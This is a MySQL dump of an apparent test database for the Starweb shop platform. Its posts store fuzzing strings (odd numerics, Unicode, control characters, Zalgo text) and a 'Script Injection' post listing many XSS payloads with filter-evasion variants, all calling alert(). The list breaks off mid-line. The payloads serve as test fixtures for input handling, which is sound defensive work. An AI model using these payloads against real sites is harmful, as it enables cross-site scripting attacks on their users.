-- MySQL dump 10.13  Distrib 5.7.28, for osx10.12 (x86_64)
--
-- Host: localhost    Database: starweb-test
-- ------------------------------------------------------
-- Server version	5.7.28

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `posts`
--

DROP TABLE IF EXISTS `posts`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `posts` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(255) DEFAULT NULL,
  `content` text,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=24 DEFAULT CHARSET=utf8mb4;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `posts`
--

LOCK TABLES `posts` WRITE;
/*!40000 ALTER TABLE `posts` DISABLE KEYS */;
INSERT INTO `posts` VALUES (1,'Välkommen till Starweb!','Starwebs e-handelsplattform har automatiserat marknadsföringen och orderflödena för B2C, B2B samt internationell handel. Starweb har över 600 nöjda kunder, allt från mindre e-handlare till några av Sveriges största företag.\n\nVi tror på: Frihet, framtid och försäljning.\n\nFriheten att jobba när, vart och hur ni vill. Oavsett enhet eller integrationer.\nFramtidssäkert i att administrationen sker från ett system med automatiska orderflöden till kringsystemen.\nÖkad försäljning genom funktioner för automatiserad marknadsföring, kombinerat med onlineannonsering.\nSedan år 2000 har Starweb hjälpt tusentals nöjda e-handlare att starta, växa och öka sin försäljning online. Starweb är en helhetsleverantör för e-handlare som löser tekniken och skapar en stark företagsidentitet.\n\nBesök Starwebs kontor i Malmö och Stockholm med närmare 30 anställda. Oavsett bransch eller storlek är ni välkomna!'),(2,'Lorem Ipsum','Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Vel pretium lectus quam id leo. Tortor aliquam nulla facilisi cras fermentum odio eu feugiat. Sit amet purus gravida quis blandit turpis cursus in hac. Sodales ut etiam sit amet nisl purus. Sapien faucibus et molestie ac feugiat. Aliquam etiam erat velit scelerisque. Vestibulum morbi blandit cursus risus at ultrices mi. Sit amet mattis vulputate enim. Ipsum suspendisse ultrices gravida dictum fusce ut placerat orci. Platea dictumst quisque sagittis purus sit amet volutpat consequat. Semper feugiat nibh sed pulvinar. Eget felis eget nunc lobortis. Venenatis tellus in metus vulputate. Lectus nulla at volutpat diam ut.\n\nNunc lobortis mattis aliquam faucibus purus in massa tempor nec. Tincidunt arcu non sodales neque sodales ut etiam sit. Neque viverra justo nec ultrices dui sapien eget mi proin. Sed odio morbi quis commodo. Condimentum id venenatis a condimentum vitae sapien pellentesque habitant. Turpis egestas maecenas pharetra convallis posuere morbi leo. Lectus arcu bibendum at varius vel pharetra vel turpis nunc. Morbi quis commodo odio aenean sed adipiscing diam. Phasellus egestas tellus rutrum tellus pellentesque eu tincidunt tortor. Velit egestas dui id ornare arcu odio ut sem. Dictum non consectetur a erat nam. Pellentesque elit eget gravida cum sociis natoque penatibus. Blandit turpis cursus in hac habitasse. Pretium quam vulputate dignissim suspendisse in est ante in. Ac tortor dignissim convallis aenean et tortor. Lacus sed viverra tellus in hac habitasse. Cras adipiscing enim eu turpis egestas pretium aenean pharetra magna. Nunc sed velit dignissim sodales ut eu sem integer vitae. Cras tincidunt lobortis feugiat vivamus at.\n\nCras ornare arcu dui vivamus arcu felis bibendum ut. Enim nulla aliquet porttitor lacus luctus accumsan tortor posuere ac. Tellus pellentesque eu tincidunt tortor aliquam nulla. Quam adipiscing vitae proin sagittis nisl rhoncus mattis. Lectus proin nibh nisl condimentum. Tellus integer feugiat scelerisque varius morbi enim nunc faucibus. Commodo ullamcorper a lacus vestibulum. Et molestie ac feugiat sed. Eleifend donec pretium vulputate sapien nec sagittis aliquam malesuada bibendum. Maecenas pharetra convallis posuere morbi leo. Est placerat in egestas erat imperdiet sed euismod. Amet mauris commodo quis imperdiet massa tincidunt nunc pulvinar sapien. Tellus in metus vulputate eu scelerisque felis imperdiet.\n\nDignissim convallis aenean et tortor at. Vestibulum rhoncus est pellentesque elit ullamcorper dignissim cras. At tellus at urna condimentum mattis. Id velit ut tortor pretium viverra suspendisse potenti nullam ac. Arcu odio ut sem nulla pharetra diam sit. Dignissim convallis aenean et tortor at risus. Ante metus dictum at tempor commodo ullamcorper a lacus. Cursus mattis molestie a iaculis at. Montes nascetur ridiculus mus mauris vitae ultricies. Sit amet nisl purus in mollis. Dui vivamus arcu felis bibendum ut tristique. Volutpat sed cras ornare arcu dui vivamus arcu. Nulla pharetra diam sit amet nisl suscipit adipiscing bibendum.\n\nCommodo viverra maecenas accumsan lacus vel facilisis. Sodales neque sodales ut etiam sit amet nisl purus in. Rhoncus urna neque viverra justo nec ultrices dui sapien eget. Ut etiam sit amet nisl purus in mollis. Pellentesque sit amet porttitor eget dolor morbi non arcu risus. Sed faucibus turpis in eu. Bibendum arcu vitae elementum curabitur vitae nunc. Vestibulum morbi blandit cursus risus at ultrices. Donec adipiscing tristique risus nec feugiat. Tincidunt arcu non sodales neque sodales. Duis ultricies lacus sed turpis tincidunt id aliquet risus. Senectus et netus et malesuada fames ac turpis egestas. Ipsum nunc aliquet bibendum enim facilisis gravida. Amet massa vitae tortor condimentum lacinia quis vel. Sagittis orci a scelerisque purus semper eget duis at tellus. Enim ut sem viverra aliquet eget. Vestibulum sed arcu non odio euismod.'),(3,'Reserved Strings','undefined\nundef\nnull\nNULL\n(null)\nnil\nNIL\ntrue\nfalse\nTrue\nFalse\nTRUE\nFALSE\nNone\nhasOwnProperty\nthen\nconstructor\n\\\n\\\\'),(4,'Numeric Strings','0\n1\n1.00\n$1.00\n1/2\n1E2\n1E02\n1E+02\n-1\n-1.00\n-$1.00\n-1/2\n-1E2\n-1E02\n-1E+02\n1/0\n0/0\n-2147483648/-1\n-9223372036854775808/-1\n-0\n-0.0\n+0\n+0.0\n0.00\n0..0\n.\n0.0.0\n0,00\n0,,0\n,\n0,0,0\n0.0/0\n1.0/0.0\n0.0/0.0\n1,0/0,0\n0,0/0,0\n--1\n-\n-.\n-,\n999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999\nNaN\nInfinity\n-Infinity\nINF\n1#INF\n-1#IND\n1#QNAN\n1#SNAN\n1#IND\n0x0\n0xffffffff\n0xffffffffffffffff\n0xabad1dea\n123456789012345678901234567890123456789\n1,000.00\n1 000.00\n1\'000.00\n1,000,000.00\n1 000 000.00\n1\'000\'000.00\n1.000,00\n1 000,00\n1\'000,00\n1.000.000,00\n1 000 000,00\n1\'000\'000,00\n01000\n08\n09\n2.2250738585072011e-308'),(5,'Special Characters',',./;\'[]\\-=\n<>?:\"{}|_+\n!@#$%^&*()`~\n\n# Non-whitespace C0 controls: U+0001 through U+0008, U+000E through U+001F,\n# and U+007F (DEL)\n# Often forbidden to appear in various text-based file formats (e.g. XML),\n# or reused for internal delimiters on the theory that they should never\n# appear in input.\n# The next line may appear to be blank or mojibake in some viewers.\n\Z\n\n# Non-whitespace C1 controls: U+0080 through U+0084 and U+0086 through U+009F.\n# Commonly misinterpreted as additional graphic characters.\n# The next line may appear to be blank, mojibake, or dingbats in some viewers.\n\n\n# Whitespace: all of the characters with category Zs, Zl, or Zp (in Unicode\n# version 8.0.0), plus U+0009 (HT), U+000B (VT), U+000C (FF), U+0085 (NEL),\n# and U+200B (ZERO WIDTH SPACE), which are in the C categories but are often\n# treated as whitespace in some contexts.\n# This file unfortunately cannot express strings containing\n# U+0000, U+000A, or U+000D (NUL, LF, CR).\n# The next line may appear to be blank or mojibake in some viewers.\n# The next line may be flagged for \"trailing whitespace\" in some viewers.\n	              ​    　\n\n# Unicode additional control characters: all of the characters with\n# general category Cf (in Unicode 8.0.0).\n# The next line may appear to be blank or mojibake in some viewers.\n­؀؁؂؃؄؅؜۝܏᠎​‌‍‎‏⁠⁡⁢⁣⁤⁦⁧⁨⁩⁪⁫⁬⁭⁮⁯﻿￹￺￻𑂽𛲠𛲡𛲢𛲣𝅳𝅴𝅵𝅶𝅷𝅸𝅹𝅺󠀁󠀠󠀡󠀢󠀣󠀤󠀥󠀦󠀧󠀨󠀩󠀪󠀫󠀬󠀭󠀮󠀯󠀰󠀱󠀲󠀳󠀴󠀵󠀶󠀷󠀸󠀹󠀺󠀻󠀼󠀽󠀾󠀿󠁀󠁁󠁂󠁃󠁄󠁅󠁆󠁇󠁈󠁉󠁊󠁋󠁌󠁍󠁎󠁏󠁐󠁑󠁒󠁓󠁔󠁕󠁖󠁗󠁘󠁙󠁚󠁛󠁜󠁝󠁞󠁟󠁠󠁡󠁢󠁣󠁤󠁥󠁦󠁧󠁨󠁩󠁪󠁫󠁬󠁭󠁮󠁯󠁰󠁱󠁲󠁳󠁴󠁵󠁶󠁷󠁸󠁹󠁺󠁻󠁼󠁽󠁾󠁿\n\n# \"Byte order marks\", U+FEFF and U+FFFE, each on its own line.\n# The next two lines may appear to be blank or mojibake in some viewers.\n﻿\n￾'),(6,'Unicode Symbols','Ω≈ç√∫˜µ≤≥÷\nåß∂ƒ©˙∆˚¬…æ\nœ∑´®†¥¨ˆøπ“‘\n¡™£¢∞§¶•ªº–≠\n¸˛Ç◊ı˜Â¯˘¿\nÅÍÎÏ˝ÓÔÒÚÆ☃\nŒ„´‰ˇÁ¨ˆØ∏”’\n`⁄€‹›ﬁﬂ‡°·‚—±\n⅛⅜⅝⅞\nЁЂЃЄЅІЇЈЉЊЋЌЍЎЏАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдежзийклмнопрстуфхцчшщъыьэюя\n٠١٢٣٤٥٦٧٨٩\n'),(7,'Unicode Subscript/Superscript/Accents','⁰⁴⁵\n₀₁₂\n⁰⁴⁵₀₁₂\nด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็'),(8,'Quotation Marks','\'\n\"\n\'\'\n\"\"\n\'\"\'\n\"\'\'\'\'\"\'\"\n\"\'\"\'\"\'\'\'\'\"\n<foo val=“bar” />\n<foo val=“bar” />\n<foo val=”bar“ />\n<foo val=`bar\' />'),(9,'Two-Byte Characters','田中さんにあげて下さい\nパーティーへ行かないか\n和製漢語\n部落格\n사회과학원 어학연구소\n찦차를 타고 온 펲시맨과 쑛다리 똠방각하\n社會科學院語學研究所\n울란바토르\n𠜎𠜱𠝹𠱓𠱸𠲖𠳏'),(10,'Special Unicode Characters Union','表ポあA鷗ŒéＢ逍Üßªąñ丂㐀𠀀\n'),(11,'Changing length when lowercased','\nȺ\nȾ\n'),(12,'Japanese Emoticons','ヽ༼ຈل͜ຈ༽ﾉ ヽ༼ຈل͜ຈ༽ﾉ\n(｡◕ ∀ ◕｡)\n｀ｨ(´∀｀∩\n__ﾛ(,_,*)\n・(￣∀￣)・:*:\nﾟ･✿ヾ╲(｡◕‿◕｡)╱✿･ﾟ\n,。・:*:・゜’( ☻ ω ☻ )。・:*:・゜’\n(╯°□°）╯︵ ┻━┻)\n(ﾉಥ益ಥ）ﾉ﻿ ┻━┻\n┬─┬ノ( º _ ºノ)\n( ͡° ͜ʖ ͡°)\n¯\\_(ツ)_/¯'),(13,'Emoji','😍\n👩🏽\n👨‍🦰 👨🏿‍🦰 👨‍🦱 👨🏿‍🦱 🦹🏿‍♂️\n👾 🙇 💁 🙅 🙆 🙋 🙎 🙍\n🐵 🙈 🙉 🙊\n❤️ 💔 💌 💕 💞 💓 💗 💖 💘 💝 💟 💜 💛 💚 💙\n✋🏿 💪🏿 👐🏿 🙌🏿 👏🏿 🙏🏿\n🚾 🆒 🆓 🆕 🆖 🆗 🆙 🏧\n0️⃣ 1️⃣ 2️⃣ 3️⃣ 4️⃣ 5️⃣ 6️⃣ 7️⃣ 8️⃣ 9️⃣ 🔟\n'),(14,'Regional Indicator Symbols','🇺🇸🇷🇺🇸 🇦🇫🇦🇲🇸\n🇺🇸🇷🇺🇸🇦🇫🇦🇲\n🇺🇸🇷🇺🇸🇦'),(15,'Unicode Numbers','\n１２３\n١٢٣'),(16,'Right-To-Left Strings','ثم نفس سقطت وبالتحديد،, جزيرتي باستخدام أن دنو. إذ هنا؟ الستار وتنصيب كان. أهّل ايطاليا، بريطانيا-فرنسا قد أخذ. سليمان، إتفاقية بين ما, يذكر الحدود أي بعد, معاملة بولندا، الإطلاق عل إيو.\nבְּרֵאשִׁית, בָּרָא אֱלֹהִים, אֵת הַשָּׁמַיִם, וְאֵת הָאָרֶץ\nהָיְתָהtestالصفحات التّحول\n﷽\nﷺ\nمُنَاقَشَةُ سُبُلِ اِسْتِخْدَامِ اللُّغَةِ فِي النُّظُمِ الْقَائِمَةِ وَفِيم يَخُصَّ التَّطْبِيقَاتُ الْحاسُوبِيَّةُ،\nالكل في المجمو عة (5)\n'),(17,'Ogham Text','᚛ᚄᚓᚐᚋᚒᚄ ᚑᚄᚂᚑᚏᚅ᚜\n᚛                 ᚜'),(18,'Trick Unicode','test\ntest\n test \ntest⁠test\n⁦test'),(19,'Zalgo Text','\nṰ̺̺̕o͞ ̷i̲̬͇̪͙n̝̗͕v̟̜̘̦͟o̶̙̰̠kè͚̮̺̪̹̱̤ ̖t̝͕̳̣̻̪͞h̼͓̲̦̳̘̲e͇̣̰̦̬͎ ̢̼̻̱̘h͚͎͙̜̣̲ͅi̦̲̣̰̤v̻͍e̺̭̳̪̰-m̢iͅn̖̺̞̲̯̰d̵̼̟͙̩̼̘̳ ̞̥̱̳̭r̛̗̘e͙p͠r̼̞̻̭̗e̺̠̣͟s̘͇̳͍̝͉e͉̥̯̞̲͚̬͜ǹ̬͎͎̟̖͇̤t͍̬̤͓̼̭͘ͅi̪̱n͠g̴͉ ͏͉ͅc̬̟h͡a̫̻̯͘o̫̟̖͍̙̝͉s̗̦̲.̨̹͈̣\n̡͓̞ͅI̗̘̦͝n͇͇͙v̮̫ok̲̫̙͈i̖͙̭̹̠̞n̡̻̮̣̺g̲͈͙̭͙̬͎ ̰t͔̦h̞̲e̢̤ ͍̬̲͖f̴̘͕̣è͖ẹ̥̩l͖͔͚i͓͚̦͠n͖͍̗͓̳̮g͍ ̨o͚̪͡f̘̣̬ ̖̘͖̟͙̮c҉͔̫͖͓͇͖ͅh̵̤̣͚͔á̗̼͕ͅo̼̣̥s̱͈̺̖̦̻͢.̛̖̞̠̫̰\n̗̺͖̹̯͓Ṯ̤͍̥͇͈h̲́e͏͓̼̗̙̼̣͔ ͇̜̱̠͓͍ͅN͕͠e̗̱z̘̝̜̺͙p̤̺̹͍̯͚e̠̻̠͜r̨̤͍̺̖͔̖̖d̠̟̭̬̝͟i̦͖̩͓͔̤a̠̗̬͉̙n͚͜ ̻̞̰͚ͅh̵͉i̳̞v̢͇ḙ͎͟-҉̭̩̼͔m̤̭̫i͕͇̝̦n̗͙ḍ̟ ̯̲͕͞ǫ̟̯̰̲͙̻̝f ̪̰̰̗̖̭̘͘c̦͍̲̞͍̩̙ḥ͚a̮͎̟̙͜ơ̩̹͎s̤.̝̝ ҉Z̡̖̜͖̰̣͉̜a͖̰͙̬͡l̲̫̳͍̩g̡̟̼̱͚̞̬ͅo̗͜.̟\n̦H̬̤̗̤͝e͜ ̜̥̝̻͍̟́w̕h̖̯͓o̝͙̖͎̱̮ ҉̺̙̞̟͈W̷̼̭a̺̪͍į͈͕̭͙̯̜t̶̼̮s̘͙͖̕ ̠̫̠B̻͍͙͉̳ͅe̵h̵̬͇̫͙i̹͓̳̳̮͎̫̕n͟d̴̪̜̖ ̰͉̩͇͙̲͞ͅT͖̼͓̪͢h͏͓̮̻e̬̝̟ͅ ̤̹̝W͙̞̝͔͇͝ͅa͏͓͔̹̼̣l̴͔̰̤̟͔ḽ̫.͕\nZ̮̞̠͙͔ͅḀ̗̞͈̻̗Ḷ͙͎̯̹̞͓G̻O̭̗̮\n\n'),(20,'Unicode Upsidedown','˙ɐnbᴉlɐ ɐuƃɐɯ ǝɹolop ʇǝ ǝɹoqɐl ʇn ʇunpᴉpᴉɔuᴉ ɹodɯǝʇ poɯsnᴉǝ op pǝs \'ʇᴉlǝ ƃuᴉɔsᴉdᴉpɐ ɹnʇǝʇɔǝsuoɔ \'ʇǝɯɐ ʇᴉs ɹolop ɯnsdᴉ ɯǝɹo˥\n00˙Ɩ$-\n\n'),(21,'Unicode font','Ｔｈｅ ｑｕｉｃｋ ｂｒｏｗｎ ｆｏｘ ｊｕｍｐｓ ｏｖｅｒ ｔｈｅ ｌａｚｙ ｄｏｇ\n𝐓𝐡𝐞 𝐪𝐮𝐢𝐜𝐤 𝐛𝐫𝐨𝐰𝐧 𝐟𝐨𝐱 𝐣𝐮𝐦𝐩𝐬 𝐨𝐯𝐞𝐫 𝐭𝐡𝐞 𝐥𝐚𝐳𝐲 𝐝𝐨𝐠\n𝕿𝖍𝖊 𝖖𝖚𝖎𝖈𝖐 𝖇𝖗𝖔𝖜𝖓 𝖋𝖔𝖝 𝖏𝖚𝖒𝖕𝖘 𝖔𝖛𝖊𝖗 𝖙𝖍𝖊 𝖑𝖆𝖟𝖞 𝖉𝖔𝖌\n𝑻𝒉𝒆 𝒒𝒖𝒊𝒄𝒌 𝒃𝒓𝒐𝒘𝒏 𝒇𝒐𝒙 𝒋𝒖𝒎𝒑𝒔 𝒐𝒗𝒆𝒓 𝒕𝒉𝒆 𝒍𝒂𝒛𝒚 𝒅𝒐𝒈\n𝓣𝓱𝓮 𝓺𝓾𝓲𝓬𝓴 𝓫𝓻𝓸𝔀𝓷 𝓯𝓸𝔁 𝓳𝓾𝓶𝓹𝓼 𝓸𝓿𝓮𝓻 𝓽𝓱𝓮 𝓵𝓪𝔃𝔂 𝓭𝓸𝓰\n𝕋𝕙𝕖 𝕢𝕦𝕚𝕔𝕜 𝕓𝕣𝕠𝕨𝕟 𝕗𝕠𝕩 𝕛𝕦𝕞𝕡𝕤 𝕠𝕧𝕖𝕣 𝕥𝕙𝕖 𝕝𝕒𝕫𝕪 𝕕𝕠𝕘\n𝚃𝚑𝚎 𝚚𝚞𝚒𝚌𝚔 𝚋𝚛𝚘𝚠𝚗 𝚏𝚘𝚡 𝚓𝚞𝚖𝚙𝚜 𝚘𝚟𝚎𝚛 𝚝𝚑𝚎 𝚕𝚊𝚣𝚢 𝚍𝚘𝚐\n⒯⒣⒠ ⒬⒰⒤⒞⒦ ⒝⒭⒪⒲⒩ ⒡⒪⒳ ⒥⒰⒨⒫⒮ ⒪⒱⒠⒭ ⒯⒣⒠ ⒧⒜⒵⒴ ⒟⒪⒢'),(22,'Script Injection','\n<script>alert(123)</script>\n&lt;script&gt;alert(&#39;123&#39;);&lt;/script&gt;\n<img src=x onerror=alert(123) />\n<svg><script>123<1>alert(123)</script>\n\"><script>alert(123)</script>\n\'><script>alert(123)</script>\n><script>alert(123)</script>\n</script><script>alert(123)</script>\n< / script >< script >alert(123)< / script >\n onfocus=JaVaSCript:alert(123) autofocus\n\" onfocus=JaVaSCript:alert(123) autofocus\n\' onfocus=JaVaSCript:alert(123) autofocus\n＜script＞alert(123)＜/script＞\n<sc<script>ript>alert(123)</sc</script>ript>\n--><script>alert(123)</script>\n\";alert(123);t=\"\n\';alert(123);t=\'\nJavaSCript:alert(123)\n;alert(123);\nsrc=JaVaSCript:prompt(132)\n\"><script>alert(123);</script x=\"\n\'><script>alert(123);</script x=\'\n><script>alert(123);</script x=\n\" autofocus onkeyup=\"javascript:alert(123)\n\' autofocus onkeyup=\'javascript:alert(123)\n<script\\x20type=\"text/javascript\">javascript:alert(1);</script>\n<script\\x3Etype=\"text/javascript\">javascript:alert(1);</script>\n<script\\x0Dtype=\"text/javascript\">javascript:alert(1);</script>\n<script\\x09type=\"text/javascript\">javascript:alert(1);</script>\n<script\\x0Ctype=\"text/javascript\">javascript:alert(1);</script>\n<script\\x2Ftype=\"text/javascript\">javascript:alert(1);</script>\n<script\\x0Atype=\"text/javascript\">javascript:alert(1);</script>\n\'`\"><\\x3Cscript>javascript:alert(1)</script>\n\'`\"><\\x00script>javascript:alert(1)</script>\nABC<div style=\"x\\x3Aexpression(javascript:alert(1)\">DEF\nABC<div style=\"x:expression\\x5C(javascript:alert(1)\">DEF\nABC<div style=\"x:expression\\x00(javascript:alert(1)\">DEF\nABC<div style=\"x:exp\\x00ression(javascript:alert(1)\">DEF\nABC<div style=\"x:exp\\x5Cression(javascript:alert(1)\">DEF\nABC<div style=\"x:\\x0Aexpression(javascript:alert(1)\">DEF\nABC<div style=\"x:\\x09expression(javascript:alert(1)\">DEF\nABC<div style=\"x:\\xE3\\x80\\x80expression(javascript:alert(1)\">DEF\nABC<div style=\"x:\\xE2\\x80\\x84expression(javascript:alert(1)\">DEF\nABC<div style=\"x:\\xC2\\xA0expression(javascript:alert(1)\">DEF\nABC<div style=\"x:\\xE2\\x80\\x80expression(javascript:alert(1)\">DEF\nABC<div style=\"x:\\xE2\\x80\\x8Aexpression(javascript:alert(1)\">DEF\nABC<div style=\"x:\\x0Dexpression(javascript:alert(1)\">DEF\nABC<div style=\"x:\\x0Cexpression(javascript:alert(1)\">DEF\nABC<div style=\"x:\\xE2\\x80\\x87expression(javascript:alert(1)\">DEF\nABC<div style=\"x:\\xEF\\xBB\\xBFexpression(javascript:alert(1)\">DEF\nABC<div style=\"x:\\x20expression(javascript:alert(1)\">DEF\nABC<div style=\"x:\\xE2\\x80\\x88expression(javascript:alert(1)\">DEF\nABC<div style=\"x:\\x00expression(javascript:alert(1)\">DEF\nABC<div style=\"x:\\xE2\\x80\\x8Bexpression(javascript:alert(1)\">DEF\nABC<div style=\"x:\\xE2\\x80\\x86expression(javascript:alert(1)\">DEF\nABC<div style=\"x:\\xE2\\x80\\x85expression(javascript:alert(1)\">DEF\nABC<div style=\"x:\\xE2\\x80\\x82expression(javascript:alert(1)\">DEF\nABC<div style=\"x:\\x0Bexpression(javascript:alert(1)\">DEF\nABC<div style=\"x:\\xE2\\x80\\x81expression(javascript:alert(1)\">DEF\nABC<div style=\"x:\\xE2\\x80\\x83expression(javascript:alert(1)\">DEF\nABC<div style=\"x:\\xE2\\x80\\x89expression(javascript:alert(1)\">DEF\n<a href=\"\\x0Bjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\x0Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\xC2\\xA0javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\x05javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\xE1\\xA0\\x8Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\x18javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\x11javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\xE2\\x80\\x88javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\xE2\\x80\\x89javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\xE2\\x80\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\x17javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\x03javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\x0Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\x1Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\x00javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\x10javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\xE2\\x80\\x82javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\x20javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\x13javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\x09javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\xE2\\x80\\x8Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\x14javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\x19javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\xE2\\x80\\xAFjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\x1Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\xE2\\x80\\x81javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\x1Djavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\xE2\\x80\\x87javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\x07javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\xE1\\x9A\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\xE2\\x80\\x83javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\x04javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\x01javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\x08javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\xE2\\x80\\x84javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\xE2\\x80\\x86javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\xE3\\x80\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\x12javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\x0Djavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\x0Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\x0Cjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\x15javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\xE2\\x80\\xA8javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\x16javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\x02javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\x1Bjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\x06javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\xE2\\x80\\xA9javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\xE2\\x80\\x85javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\x1Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\xE2\\x81\\x9Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"\\x1Cjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"javascript\\x00:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"javascript\\x3A:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"javascript\\x09:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"javascript\\x0D:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n<a href=\"javascript\\x0A:javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n`\"\'><img src=xxx:x \\x0Aonerror=javascript:alert(1)>\n`\"\'><img src=xxx:x \\x22onerror=javascript:alert(1)>\n`\"\'><img src=xxx:x \\x0Bonerror=javascript:alert(1)>\n`\"\'><img src=xxx:x \\x0Donerror=javascript:alert(1)>\n`\"\'><img src=xxx:x \\x2Fonerror=javascript:alert(1)>\n`\"\'><img src=xxx:x \\x09onerror=javascript:alert(1)>\n`\"\'><img src=xxx:x \\x0Conerror=javascript:alert(1)>\n`\"\'><img src=xxx:x \\x00onerror=javascript:alert(1)>\n`\"\'><img src=xxx:x \\x27onerror=javascript:alert(1)>\n`\"\'><img src=xxx:x 